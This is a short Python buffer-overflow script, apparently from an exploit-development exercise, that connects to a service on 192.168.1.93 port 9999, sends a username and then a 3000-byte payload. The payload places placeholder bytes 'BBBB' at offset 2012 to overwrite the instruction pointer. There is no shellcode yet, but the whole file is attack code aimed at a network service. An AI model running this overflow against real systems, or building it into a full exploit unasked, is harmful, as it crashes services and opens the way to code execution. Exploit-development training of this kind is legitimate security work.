import socket, struct



host, port = '192.168.1.93', 9999

username = b'Generic User'
next_prompt = b'\r\n'
new_eip = b'BBBB'
length = 3000
offset = 2012
payload = b''.join([
b'A'*offset,
new_eip,
b'C' * (length - offset - len(new_eip))
])




with socket.socket() as s:
        s.connect((host,port))
        s.recv(1024)
        s.send(username + next_prompt)
        s.recv(1024)
        s.send(payload + next_prompt)
